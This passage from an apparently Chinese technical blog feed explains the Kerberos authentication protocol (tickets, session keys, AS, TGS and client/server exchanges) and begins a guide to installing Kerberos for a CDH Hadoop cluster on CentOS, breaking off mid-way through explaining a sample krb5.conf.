&lt;p&gt;原文 &lt;a href=&quot;https://medium.com/analytics-and-data/overview-of-the-different-approaches-to-putting-machinelearning-ml-models-in-production-c699b34abf86&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;overview of the different approaches to putting machine learning (ml) models in production&gt;&lt;/overview&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/bec9bff2gy1g37wmih501j20m80fwmzi.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/categories/Reading-notes/Mechine-Learning/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/tags/Mechine-Learning/"/>
    
  </entry>
  
  <entry>
    <title>Kerberos For CDH</title>
    <link href="http://yoursite.com/2019/05/20/Kerberos%20For%20CDH/"/>
    <id>http://yoursite.com/2019/05/20/Kerberos For CDH/</id>
    <published>2019-05-19T17:06:11.525Z</published>
    <updated>2019-05-15T01:27:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>从18年底开始，公司的服务器经常受到各种挖矿脚本病毒的公司，Java后端Redis漏洞层出不穷，Hadoop这边MR的提交权限BUG也被利用了，于是决定调研Kerberos，发现Kerberos是一个巨大的坑，在此记录下笔记，作为我的Github Pages第一篇文档，希望后来人少走弯路。此文可能分为几次更新。</p><p>第一次更新：2019-4-29</p><p>第二次更新：2019-5-10</p><a id="more"></a> <h3 id="1-Kerberos-入门"><a href="#1-Kerberos-入门" class="headerlink" title="1.Kerberos 入门"></a>1.Kerberos 入门</h3><p>Kerberos是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。Hadoop集群中涉及的Kerberos一般是指MIT基于Kerberos协议开发的一套软件。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2fvwiwb03g20rs0fvaa2.gif" alt="ALT Kerberos"></p><p>Kerberos在希腊神话中是Hades的一条凶猛的三头保卫神犬。这三个头在Kerberos代表了Client、Server和KDC。</p><p><em>Kerberos的特点</em>：并不要求通信双方所在的网络环境安全，即使通信过程中数据被截取或者篡改，依然不会影响整套机制的正常工作。时间戳是Kerberos用来保证通信安全的重要手段。</p><p><em>Kerberos的基本思路</em>：基于对称加密，利用集中的认证服务器，实现用户和服务器之间的双向认证。(提供一种不能伪造、不能重放、已经鉴别的票据对象)。</p><hr><h3 id="2-Kerberos涉及名词"><a href="#2-Kerberos涉及名词" class="headerlink" title="2.Kerberos涉及名词"></a>2.Kerberos涉及名词</h3><p><strong>Principal</strong>：认证的主体，简单来说也就是 用户名</p><p><strong>Kinit</strong>：Kerberos认证(登录)命令，可以使用密码或者KEYTAB</p><p><strong>realm</strong>：有点类似namespace，一个principle只有在某个realm下才有意义</p><p><strong>Password</strong>：某个用户的密码，对应于Kerberos中的master key。password可以存在一个KEYTAB文件中。所以Kerberos中需要使用密码的场景都可以用一个KEYTAB作为输入</p><p><strong>credential</strong>：credential是“证明某个人确定是他自己/某一种行为的确可以发生”的凭据。在不同的使用场景下， credential的具体含义也略有不同：</p><ul><li><p>对于某个principal个体而言，他的credential就是他的password</p></li><li><p>在Kerberos认证的环节中，credential就意味着各种各样的ticket</p></li></ul><p><strong>TGT</strong>：Ticket Granting Ticket，要获得key还需要一个资格认证，获得这个资格认证的证明，叫做TGT</p><p><strong>Long-term Key/Master Key</strong>：在Security的领域中，有的Key可能长期内保持不变，比如你在密码，可能几年都不曾改变，这样的Key、以及由此派生的Key被称为Long-term Key。对于Long-term Key的使用有这样的原则：被Long-term Key加密的数据不应该在网络上传输。原因很简单，一旦这些被Long-term Key加密的数据包被恶意的网络监听者截获，在原则上，只要有充足的时间，他是可以通过计算获得你用于加密的Long-term Key的——任何加密算法都不可能做到绝对保密。</p><p><strong>Short-term Key/Session Key</strong>：由于被Long-term Key加密的数据包不能用于网络传送，所以我们使用另一种Short-term<br>Key来加密需要进行网络传输的数据。由于这种Key只在一段时间内有效，即使被加密的数据包被黑客截获，等他把Key计算出来的时候，这个Key早就已经过期了。</p><hr><h3 id="3-Kerberos原理"><a href="#3-Kerberos原理" class="headerlink" title="3.Kerberos原理"></a>3.Kerberos原理</h3><p>最简单的对称加密的思路：A发送信息给B，信息分为两段，一段是明文，一段是加密之后的密文，这个密钥只有A和B两个人知道，B收到信息后，用两个人都知道的密钥破解了这段密文，如果破解之后的内容和明文内容一致就说明 A的身份没有问题。</p><p><strong>Kerberos就是基于此基础之上的一套复杂的认证机制。</strong></p><p>下面对整个认证过程进行一个细致的分析，对于安装部署过程中纠错来说（尤其CDH集群集成的<code>Kerberos</code>有一些问题），这个过程是非常有必要的：</p><p>通过第二节介绍的两种Key，让被认证的一方提供一个仅限于他和认证方知晓的Key来鉴定对方的真实身份。而被这个<code>Key</code>加密的数据包需要在<code>Client</code>和<code>Server</code>之间传送，所以这个<code>Key</code>不能是一个<code>Long-term Key</code>，而只可能是<code>hort-term Key</code>，这个可以仅仅在<code>Client</code>和<code>Server</code>的一个<code>Session</code>中有效，所以我们称这个<code>Key</code>为<code>Client</code>和<code>Server</code>之间的<code>Session Key（Sserver-Client）</code>。</p><p>这个<code>Sserver-Client</code> 需要引入<code>Kerberos</code>中的一个十分重要的觉得：<code>Kerberos Distribution Center-KDC</code>。<code>KDC</code>在整个<code>Kerberos</code>认证流程中作为<code>Client</code>和<code>Server</code>共同信任的第三方起着重要的作用，而<code>Kerberos</code>的认证过程就是通过这三方协作完成。<code>KDC</code>中维护着一个存储着该<code>Domain</code>中所有账户的<code>Account Database</code>（一个轻量级的数据库），这个数据库汇中存储着每个<code>Account</code>的名称和派生于该<code>Account Password</code>的<code>Master Key</code>，派生手段一般来说是类似Hash这种，不可逆的，然后可以一一对应的方法。</p><p>稍微扩展一下上面的<code>key</code>的分发过程：</p><p>首先是<code>Client</code>向<code>KDC</code>发送一个对<code>SServer-Client</code>的申请。这个申请的内容可以简单概括为“我是某个<code>Client</code>，我需要一个<code>Session Key</code>用于访问某个<code>Server</code> ”。<code>KDC</code>在接受了这个请求以后，生成一个<code>Session</code>Key，为了保证这个<code>Session Key</code>仅仅限于发送请求的<code>Client</code>和他希望访问的<code>Server</code>知晓，<code>KDC</code>会为这个<code>Session Key</code>生成两个<code>Copy</code>，分别被<code>Client</code>和<code>Server</code>使用。然后从<code>Account database</code>中提取<code>Client</code>和<code>Server</code>的<code>Master Key</code>分别对这两个<code>Copy</code>进行对称加密。对于后者，和<code>Session Key</code>一起被加密的还包含关于<code>Client</code>的一些信息。（这里的<code>Client</code>可以理解为发送连接请求的节点，<code>Server</code>可以理解为<code>Client</code>发送请求的接受节点）。</p><p>现在KDC有了两个分别被<code>Master</code>和<code>Server</code>的<code>Master key</code>加密过的<code>Session Key</code>，下面介绍这两个<code>Session Key</code>的处理方式。</p><p>Kerberos 并不会直接把两个加密包分别发送给<code>Client</code>和<code>Server</code>，原因主要有两个：</p><p>第一：由于一个<code>Server</code>会面对若干不同的<code>Client</code>, 而每个<code>Client</code>都具有一个不同的<code>Session Key</code>。那么<code>Server</code>就会为所有的<code>Client</code>维护这样一个<code>Session Key</code>的列表，这样对于<code>Server</code>来说是比较麻烦而低效的。</p><p>第二：由于网络传输的不确定性，可能出现这样一种情况：<code>Client</code>很快获得<code>Session Key</code>，并将这个<code>Session Key</code>作为<code>Credential</code>随同访问请求发送到<code>Server</code>，但是用于<code>Server</code>的<code>Session Key</code>确还没有收到，并且很有可能承载这个<code>Session Key</code>的永远也到不了<code>Server</code>端，<code>Client</code>将永远得不到认证。</p><p>为了解决这个问题，<code>Kerberos</code>的做法是：<strong>将这两个被加密的<code>Copy</code>一并发送给<code>Client</code>，属于<code>Server</code>的那份由<code>Client</code>发送给<code>Server</code>。</strong></p><p><code>Client</code>实际上获得了两组信息：一个通过自己<code>Master Key</code>加密的<code>Session Key</code>，另一个被<code>Server</code>的<code>Master Key</code>加密的数据包，包含<code>Session Key</code>和关于自己的一些确认信息。通过一个双方知晓的<code>Key</code>就可以对对方进行有效的认证，但是在一个网络的环境中，这种简单的做法是具有安全漏洞，为此,<code>Client</code>需要提供更多的证明信息，我们把这种证明信息称为<code>Authenticator</code>，在<code>Kerberos</code>的<code>Authenticator</code>实际上就是关于<code>Client</code>的一些信息和当前时间的一个<code>Timestamp</code>。</p><p><code>Client</code>通过自己的<code>Master Key</code>对<code>KDC</code>加密的<code>Session Key</code>进行解密从而获得<code>Session Key</code>，随后创建<strong><code>Authenticator（Client Info + Timestamp）</code></strong>并用<code>Session Key</code>对其加密。最后连同从<code>KDC</code>获得的、被<code>Server</code>的<code>Master Key</code>加密过的数据包<strong><code>（Client Info + Session Key）</code></strong>一并发送到<code>Server</code>端。我们把通过<code>Server</code>的<code>Master Key</code>加密过的数据包称为<code>Session Ticket</code>。当<code>Server</code>接收到这两组数据后，先使用他自己的<code>Master Key</code>对<code>Session Ticket</code>进行解密，从而获得<code>Session Key</code>。随后使用该<code>Session Key</code>解密<code>Authenticator</code>，通过比较<code>Authenticator</code>中的<code>Client Info</code>和<code>Session Ticket</code>中的<code>Client Info</code>从而实现对Client的认证。</p><p>这里涉及到了一个<code>Timestamp</code>，<code>Client</code>向<code>Server</code>发送的数据包如果被某个恶意网络监听者截获，该监听者随后将数据包作为自己的<code>Credential</code>冒充该<code>Client</code>对<code>Server</code>进行访问，在这种情况下，依然可以很顺利地获得<code>Server</code>的成功认证。为了解决这个问题，<code>Client</code>在<code>Authenticator</code>中会加入一个当前时间的<code>Timestamp</code>。</p><p>在<code>Server</code>对<code>Authenticator</code>中的<code>Client Info</code>和<code>Session Ticket</code>中的<code>Client Info</code>进行比较之前，会先提取<code>Authenticator</code>中的<code>Timestamp</code>，并同当前的时间进行比较，如果他们之间的偏差超出一个可以<strong>接受的时间范围（一般是5mins）</strong>，<code>Server</code>会直接拒绝该<code>Client</code>的请求。在这里需要知道的是，<code>Server</code>维护着一个列表，这个列表记录着在这个可接受的时间范围内所有进行认证的Client和认证的时间。对于时间偏差在这个可接受的范围中的<code>Client</code>，<code>Server</code>会从这个列表中获得<strong>最近一个该<code>Client</code>的认证时间</strong>，只有当<code>Server</code>接收到<code>Authenticator</code>时，验证<code>Authenticator</code>中的<code>Timestamp</code>，确定传输时间小于接受范围后，<code>Server</code>才采用进行后续的认证流程。</p><hr><p><strong><code>Time Synchronization</code>的重要性</strong></p><p>上述基于<code>Timestamp</code>的认证机制只有在<code>Client</code>和<code>Server</code>端的时间保持同步的情况才有意义。所以保持<code>Time</code> <code>Synchronization</code>在整个认证过程中显得尤为重要。在一个<code>Domain</code>中，一般通过访问同一个<code>Time Service</code>获得当前时间的方式来实现时间的同步。</p><p><strong>双向认证（Mutual Authentication）</strong></p><p><code>Kerberos</code>一个重要的优势在于它能够提供双向认证：不但<code>Server</code>可以对<code>Client</code> 进行认证，<code>Client</code>也能对<code>Server</code>进行认证。</p><p>具体过程是这样的，如果<code>Client</code>需要对他访问的<code>Server</code>进行认证，会在它向<code>Server</code>发送的<code>Credential</code>中设置一个是否需要认证的<code>Flag</code>。<code>Server</code>在对<code>Client</code>认证成功之后，会把<code>Authenticator</code>中的<code>Timestamp</code>提出来，通过<code>Session Key</code>进行加密，当<code>Client</code>接收到并使用<code>Session Key</code>进行解密之后，如果确认<code>Timestamp</code>和原来的完全一致，那么他可以认定<code>Server</code>正试图访问的<code>Server</code>。</p><p>那么为什么<code>Server</code>不直接把通过Session Key进行加密的<code>Authenticator</code>原样发送给<code>Client</code>，而要把<code>Timestamp</code>提取出来加密发送给<code>Client</code>呢？原因在于防止恶意的监听者通过获取的<code>Client</code>发送的<code>Authenticator</code>冒充<code>Server</code>获得<code>Client</code>的认证。</p><p><strong>More</strong>：</p><p>通过上面的介绍，我们发现<code>Kerberos</code>实际上一个基于<code>Ticket</code>的认证方式。<code>Client</code>想要获取<code>Server</code>端的资源，先得通过<code>Server</code>的认证；而认证的先决条件是<code>Client</code>向<code>Server</code>提供从<code>KDC</code>获得的一个有<code>Server</code>的<code>Master Key</code>进行加密的<code>Session Ticket</code>（<code>Session Key + Client Info</code>）。可以这么说，<code>Session Ticket</code>是<code>Client</code>进入<code>Server</code>领域的一张门票。而这张门票必须从一个合法的<code>Ticket</code>颁发机构获得，这个颁发机构就是<code>Client</code>和<code>Server</code>双方信任的<code>KDC</code>， 同时这张<code>Ticket</code>具有超强的防伪标识：<strong>它是被<code>Server</code>的<code>Master Key</code>加密的。对<code>Client</code>来说， 获得<code>Session</code> <code>Ticket</code>是整个认证过程中最为关键的部分。</strong></p><hr><p>我了解到这儿感觉已经差不多了，然而这还只是Kerbeos的梗概  T_T</p><p><code>Client</code>要获得<code>Ticket</code>之前，还需要一个步骤，即获得<code>KDC</code>的权限确认，这个过程叫做<code>TGT：Ticket</code><br><code>Granting Ticket</code>。<code>TGT</code>的分发方仍然是<code>KDC</code>。首先<code>Client</code>向<code>KDC</code>发起对<code>TGT</code>的申请，申请的内容大致可以这样表示：“我需要一张<code>TGT</code>用以申请获取用以访问所有<code>Server</code>的<code>Ticket</code>”。<code>KDC</code>在收到该申请请求后，生成一个用于该<code>Client</code>和<code>KDC</code>进行安全通信的<code>Session Key（SKDC-Client）</code>。为了保证该<code>Session Key</code>仅供该<code>Client</code>和自己使用，<code>KDC</code>使用<code>Client</code>的<code>Master Key</code>和自己的<code>Master Key</code>对生成的<code>Session Key</code>进行加密，从而获得两个加密的<code>SKDC-Client</code>的<code>Copy</code>。对于后者，随<code>SKDC-Client</code>一起被加密的还包含以后用于鉴定<code>Client</code>身份的关于<code>Client</code>的一些信息。最后<code>KDC</code>将这两份<code>Copy</code>一起发送给<code>Client</code>。这里有一点需要注意的是：为了免去<code>KDC</code>对于基于不同<code>Client</code>的<code>Session Key</code>进行维护的麻烦，就像<code>Server</code>不会保存<code>Session Key（SServer-Client）</code>一样，<code>KDC</code>也不会去保存这个<code>Session Key（SKDC-Client）</code>，而选择完全靠<code>Client</code>自己提供的方式。</p><p>当<code>Client</code>收到<code>KDC</code>的两个加密数据包之后，先使用自己的<code>Master Key</code>对第一个<code>Copy</code>进行解密，从而获得<code>KDC</code>和<code>Client</code>的<code>Session</code><br><code>Key（SKDC-Client）</code>，并把该<code>Session</code> 和<code>TGT</code>进行缓存。有了<code>Session Key</code>和<code>TGT</code>，<code>Client</code>自己的<code>Master</code><br><code>Key</code>将不再需要，因为此后<code>Client</code>可以使用<code>SKDC-Client</code>向<code>KDC</code>申请用以访问每个<code>Server</code>的<code>Ticket</code>。同时需要注意的是<code>SKDC-Client</code>是一个<code>Session Key</code>，他具有自己的生命周期，同时<code>TGT</code>和<code>Session</code>相互关联，当<code>Session Key</code>过期，<code>TGT</code>也就宣告失效，此后<code>Client</code>不得不重新向<code>KDC</code>申请新的<code>TGT</code>，<code>KDC</code>将会生成一个不同<code>Session Key</code>和与之关联的<code>TGT</code>。同时，由于<code>Client Log off</code>也导致<code>SKDC-Client</code>的失效，所以<code>SKDC-Client</code>又被称为<code>Logon Session Key</code>。<strong><code>TGT</code>和<code>Ticket</code>有个区别就是<code>Ticket</code>是基于某个具体的<code>Server</code>的，而<code>TGT</code>则是和具体的<code>Server</code>无关的。</strong></p><p><code>Client</code>在获得自己和<code>KDC</code>的<code>Session Key（SKDC-Client）</code>之后，生成自己的<code>Authenticator</code>以及所要访问的<code>Server</code>名称的并使用<code>SKDC-Client</code>进行加密。随后连同<code>TGT</code>一起发送给<code>KDC</code>。<code>KDC</code>使用自己的<code>Master Key</code>对<code>TGT</code>进行解密，提取<code>Client Info</code>和<code>Session Key（SKDC-Client）</code>，然后使用这个<code>SKDC-Client</code>解密<code>Authenticator</code>获得<code>Client Info</code>，对两个<code>Client Info</code>进行比较进而验证对方的真实身份。验证成功，生成一份基于<code>Client</code>所要访问的<code>Server</code>的<code>Ticket</code>给<code>Client</code>，然后继续上面之说的过程。</p><p>介绍了这么多，重新把整个过程理一遍：</p><p>现在介绍的整个Authentication过程大概分为三个子过程</p><ul><li><p>Client向KDC申请TGT（Ticket Granting Ticket）。</p></li><li><p>Client通过获得TGT向DKC申请用于访问Server的Ticket。</p></li><li><p>Client最终向为了Server对自己的认证向其提交Ticket。</p></li></ul><p>整个Kerberos Authentication认证过程通过3个sub-protocol来完成：</p><ol><li>Authentication Service Exchange</li><li>Ticket Granting Service Exchange</li><li>Client/Server Exchange</li></ol><p>下面内容来自官方文档的翻译：</p><p>1.Authentication Service Exchange</p><p><code>Client</code>向<code>KDC</code>的<code>Authentication Service</code>发送<code>Authentication Service Request</code>（<code>KRB_AS_REQ</code>）, 为了确保<code>KRB_AS_REQ</code>仅限于自己和<code>KDC</code>知道，<code>Client</code>使用自己的<code>Master Key</code>对<code>KRB_AS_REQ</code>的主体部分进行加密（<code>KDC</code>可以通过<code>Domain</code> 的<code>Account Database</code>获得该<code>Client</code>的<code>Master Key</code>）。<code>KRB_AS_REQ</code>的大体包含以下的内容：</p><ul><li><code>Pre-authentication data</code>：包含用以证明自己身份的信息。说白了，就是证明自己知道自己声称的那个<code>account</code>的<code>Password</code>。一般地，它的内容是一个被<code>Client</code>的<code>Master key</code>加密过的<code>Timestamp</code>。</li><li><code>Client name</code> &amp; <code>realm</code>: 简单地说就是<code>Domain name\Client</code></li><li><code>Server Name</code>：注意这里的<code>Server Name</code>并不是<code>Client</code>真正要访问的<code>Server</code>的名称，而我们也说了<code>TGT</code>是和<code>Server</code>无关的（<code>Client</code>只能使用<code>Ticket</code>，而不是<code>TGT</code>去访问<code>Server</code>）。这里的<code>Server Name</code>实际上是<code>KDC</code>的<code>Ticket Granting Service</code>的<code>Server Name</code>。</li></ul><p><code>AS（Authentication Service）</code>通过它接收到的<code>KRB_AS_REQ</code>验证发送方的是否是在<code>Client name</code> &amp; <code>realm</code>中声称的那个人，也就是说要验证发送方是否知道<code>Client</code>的<code>Password</code>。所以<code>AS</code>只需从<code>Account Database</code>中提取<code>Client</code>对应的<code>Master Key</code>对<code>Pre-authentication data</code>进行解密，如果是一个合法的<code>Timestamp</code>，则可以证明发送方提供的是正确无误的密码。验证通过之后，<code>AS</code>将一份<code>Authentication Service</code> <code>Response（KRB_AS_REP）</code>发送给<code>Client</code>。<code>KRB_AS_REQ</code>主要包含两个部分：本<code>Client</code>的<code>Master Key</code>加密过的<code>Session Key（SKDC-Client：Logon Session Key）</code>和被自己（<code>KDC</code>）加密的<code>TGT</code>。而<code>TGT</code>大体又包含以下的内容：</p><ul><li><p><code>Client name &amp; realm</code>: 简单地说就是<code>Domain name\Client</code></p></li><li><p><code>Client name &amp; realm</code>: 简单地说就是<code>Domain name\Client</code></p></li><li><p><code>End time</code>: <code>TGT</code>到期的时间</p></li></ul><p>Client通过自己的Master Key对第一部分解密获得Session Key（SKDC-Client：Logon Session Key）之后，携带着TGT便可以进入下一步：TGS（Ticket Granting Service）Exchange。</p><p>2.Ticket Granting Service Exchange</p><p><code>TGS</code>（<code>Ticket Granting Service</code>）<code>Exchange</code>通过<code>Client</code>向<code>KDC</code>中的<code>TGS</code>（<code>Ticket Granting Service</code>）发送<code>Ticket Granting Service Request</code>（<code>KRB_TGS_REQ</code>）开始。<code>KRB_TGS_REQ</code>大体包含以下的内容：</p><ul><li><p>TGT：Client通过AS Exchange获得的Ticket Granting Ticket，TGT被KDC的Master Key进行加密。</p></li><li><p>Authenticator：用以证明当初TGT的拥有者是否就是自己，所以它必须以TGT的办法方和自己的Session Key（SKDC-Client：Logon Session Key）来进行加密。</p></li><li><p>Client name &amp; realm: 简单地说就是Domain name\Client。</p></li><li><p>Server name &amp; realm: 简单地说就是Domain name\Server，这回是Client试图访问的那个Server。</p></li></ul><p><code>TGS</code>收到<code>KRB_TGS_REQ</code>在发给<code>Client</code>真正的<code>Ticket</code>之前，先得整个<code>Client</code>提供的那个<code>TGT</code>是否是<code>AS</code>颁发给它的。于是它不得不通过<code>Client</code>提供的<code>Authenticator</code>来证明。但是<code>Authentication</code>是通过<code>Logon Session Key（SKDC-Client）</code>进行加密的，而自己并没有保存这个<code>Session Key</code>。所以TGS先得通过自己的<code>Master Key</code>对<code>Client</code>提供的<code>TGT</code>进行解密，从而获得这个<code>Logon Session Key（SKDC-Client）</code>，再通过这个<code>Logon Session Key（SKDC-Client）</code>解密<code>Authenticator</code>进行验证。验证通过向对方发送<code>Ticket Granting</code><br><code>Service Response（KRB_TGS_REP）</code>。这个<code>KRB_TGS_REP</code>有两部分组成：使用<code>Logon Session Key（SKDC-Client）</code>加密过用于<code>Client</code>和<code>Server</code>的<code>Session Key（SServer-Client）</code>和使用<code>Server</code>的<code>Master Key</code>进行加密的<code>Ticket</code>。该<code>Ticket</code>大体包含以下一些内容：</p><ul><li><p>Client name &amp; realm: 简单地说就是Domain name\Client</p></li><li><p>Client name &amp; realm: 简单地说就是Domain name\Client</p></li><li><p>End time: Ticket的到期时间</p></li></ul><p><code>Client</code>收到<code>KRB_TGS_REP</code>，使用<code>Logon Session Key（SKDC-Client）</code>解密第一部分后获得<code>Session Key（SServer-Client）</code>。有了<code>Session Key</code>和<code>Ticket，Client</code>就可以之间和<code>Server</code>进行交互，而无须在通过<code>KDC</code>作中间人了。所以我们说<code>Kerberos</code>是一种高效的认证方式，它可以直接通过<code>Client</code>和<code>Server</code>双方来完成，不像Windows NT 4下的<code>NTLM</code>认证方式，每次认证都要通过一个双方信任的第3方来完成。</p><p>我们现在来看看 <code>Client</code>如果使用<code>Ticket</code>和<code>Server</code>怎样进行交互的，这个阶段通过我们的第3个<code>Sub-protocol</code>来完成：<code>CS（Client/Server ）Exchange</code>。</p><ol start="3"><li>CS（Client/Server ）Exchange</li></ol><p>这个已经经介绍过。<code>Client</code>通过<code>TGS Exchange</code>获得<code>Client</code>和<code>Server</code>的<code>Session Key（SServer-Client）</code>，随后创建用于证明自己就是Ticket的真正所有者的<code>Authenticator</code>，并使用<code>Session Key（SServer-Client）</code>进行加密。最后将这个被加密过的<code>Authenticator</code>和<code>Ticket</code>作为<code>Application Service Request（KRB_AP_REQ）</code>发送给<code>Server</code>。除了上述两项内容之外，<code>KRB_AP_REQ</code>还包含一个<code>Flag</code>用于表示<code>Client</code>是否需要进行双向验证（<code>Mutual Authentication</code>）。</p><p><code>Server</code>接收到<code>KRB_AP_REQ</code>之后，通过自己的<code>Master Key</code>解密<code>Ticket</code>，从而获得<code>Session Key（SServer-Client）</code>。通过<code>Session Key（SServer-Client）</code>解密<code>Authenticator</code>，进而验证对方的身份。验证成功，让<code>Client</code>访问需要访问的资源，否则直接拒绝对方的请求。</p><p>对于需要进行双向验证，<code>Server</code>从<code>Authenticator</code>提取<code>Timestamp</code>，使用<code>Session Key（SServer-Client）</code>进行加密，并将其发送给<code>Client</code>用于<code>Client</code>验证<code>Server</code>的身份。</p><hr><p>以上是2000年的<code>Kerberos</code>技术，和今天我们使用的<code>Kerberos</code>是不太相同的，因为这样的一个认证过程有一个最大的隐患就是<strong>Long-term Key加密的数据在网络中传递</strong>。</p><p>解决办法也很简单：就是采用一个<code>Short-term</code>的<code>Session Key</code>，而不是<code>Server Master Key</code>对<code>Ticket</code>进行加密。这就是<code>Kerberos</code>的第四个<code>Sub-protocol</code>：<code>User2User Protocol</code>。</p><p>因为<code>KDC</code>是不是维护<code>Session Key</code>的，所以这个<code>Session key</code>只能靠申请<code>Ticket</code>的<code>Client</code>提供，所以在原先的第一步和第二步之间，<code>Client</code>还得对<code>Server</code>进行请求已获得<code>Server</code>和<code>KDC</code>之间的<code>Session Key</code>。而对于<code>Server</code>来说，他可以像<code>Client</code>一样通过<code>AS Exchange</code>获得他和<code>KDC</code>之间的<code>Session Key</code>（<code>SKDC-Server</code>）和一个封装了这个<code>Session Key</code>并被<code>KDC</code>的<code>Master Key</code>进行加密的<code>TGT</code>，一旦获得这个<code>TGT</code>，<code>Server</code>会缓存它，以待<code>Client</code>对它的请求。</p><p>所以现在添加完这个User2User的认证过程，这个过程有4个步骤组成，四个步骤如下：</p><ul><li><p>AS Exchange：Client通过此过程获得了属于自己的TGT，有了此TGT，Client可凭此向KDC申请用于访问某个Server的Ticket。</p></li><li><p>User2User：这一步的主要任务是获得封装了Server和KDC的Session Key（SKDC-Server）的属于Server的TGT。如果该TGT存在于Server的缓存中，则Server会直接将其返回给Client。否则通过AS Exchange从KDC获取。</p></li><li>TGS Exchange：Client通过向KDC提供自己的TGT，Server的TGT以及Authenticator向KDC申请用于访问Server的Ticket。KDC使用先用自己的Master Key解密Client的TGT获得SKDC-Client，通过SKDC-Client解密Authenticator验证发送者是否是TGT的真正拥有者，验证通过再用自己的Master Key解密Server的TGT获得KDC和Server 的Session Key（SKDC-Server），并用该Session Key加密Ticket返回给Client。</li><li>C/S Exchange：Client携带者通过KDC和Server 的Session Key（SKDC-Server）进行加密的Ticket和通过Client和Server的Session Key（SServer-Client）的Authenticator访问Server，Server通过SKDC-Server解密Ticket获得SServer-Client，通过SServer-Client解密Authenticator实现对Client的验证。</li></ul><hr><h3 id="4-Kerberos的安装和Apach原生HDFS的配置"><a href="#4-Kerberos的安装和Apach原生HDFS的配置" class="headerlink" title="4.Kerberos的安装和Apach原生HDFS的配置"></a>4.Kerberos的安装和Apach原生HDFS的配置</h3><p><strong>环境：</strong></p><ul><li>Linux版本：CentOS Linux release 7.2.1511 (Core)</li><li>CDH版本：5.13.3</li><li>JDK版本：jdk1.8.0_144</li><li>运行用户：root</li></ul><p><strong>准备工作：</strong></p><p>确认添加主机名解析到/etc/hosts 文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.16.0.3  master</span><br><span class="line">172.16.0.4  datanode0</span><br><span class="line">172.16.0.5  datanode1</span><br></pre></td></tr></table></figure><p>hostname 请使用小写，要不然在集成Kerberos 时会出现一些错误。</p><p><strong>安装Kerberos</strong>:</p><p>在<code>master</code>上安装包 <code>krb5</code>、<code>krb5-server</code> 和<code>krb5-client</code>。</p><p><code>yum install krb5-server -y</code></p><p>在所有节点上安装<code>krb5-devel</code>、<code>krb5-workstation</code>：</p><p><code>yum install krb5-devel krb5-workstation -y</code></p><p>修改配置文件</p><p>Kerberos的配置文件需要修改三个</p><p><code>/etc/krb5.conf</code></p><p><code>/var/kerberos/krb5kdc/kdc.conf</code></p><p><code>/var/kerberos/krb5kdc/kadm5.acl</code></p><p>配置Kerberos的krb5.conf</p><p>官网样例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[libdefaults]</span><br><span class="line">    default_realm = ATHENA.MIT.EDU</span><br><span class="line">    dns_lookup_kdc = true</span><br><span class="line">    dns_lookup_realm = false</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">    ATHENA.MIT.EDU = &#123;</span><br><span class="line">        kdc = kerberos.mit.edu</span><br><span class="line">        kdc = kerberos-1.mit.edu</span><br><span class="line">        kdc = kerberos-2.mit.edu</span><br><span class="line">        admin_server = kerberos.mit.edu</span><br><span class="line">        master_kdc = kerberos.mit.edu</span><br><span class="line">    &#125;</span><br><span class="line">    EXAMPLE.COM = &#123;</span><br><span class="line">        kdc = kerberos.example.com</span><br><span class="line">        kdc = kerberos-1.example.com</span><br><span class="line">        admin_server = kerberos.example.com</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">[domain_realm]</span><br><span class="line">    mit.edu = ATHENA.MIT.EDU</span><br><span class="line"></span><br><span class="line">[capaths]</span><br><span class="line">    ATHENA.MIT.EDU = &#123;</span><br><span class="line">           EXAMPLE.COM = .</span><br><span class="line">    &#125;</span><br><span class="line">    EXAMPLE.COM = &#123;</span><br><span class="line">           ATHENA.MIT.EDU = .</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>说明：样例来自MIT官网，部分配置选项含义如下：</p><p><code>[logging]</code>：表示 server 端的日志的打印位置</p><p><code>[libdefaults]</code>：每种连接的默认配置，需要注意以下几个关键的小配置</p><p><code>default_realm = EXAMPLE.COM</code>：设置 Kerberos 应用程序的默认领域。如果您有多个领域，只需向 [realms] 节添加其他的语句。</p><p><code>ticket_lifetime</code>： 表明凭证生效的时限，一般为24小时。</p><p><code>renew_lifetime</code>： 表明凭证最长可以被延期的时限，一般为一个礼拜。当凭证过期之后，对安全认证的服务的后续访问则会失败。</p><p><code>clockskew</code>：时钟偏差是不完全符合主机系统时钟的票据时戳的容差，超过此容差将不接受此票据。通常，将时钟扭斜设置为 300 秒（5 分钟）。这意味着从服务器的角度看，票证的时间戳与它的偏差可以是在前后 5 分钟内。</p><p><code>udp_preference_limit= 1</code>：禁止使用 udp 可以防止一个 Hadoop 中的错误</p><p><code>[realms]</code>：列举使用的 realm。</p><p><code>kdc</code>：代表要 kdc 的位置。格式是 机器:端口</p><p><code>admin_server</code>：代表 admin 的位置。格式是 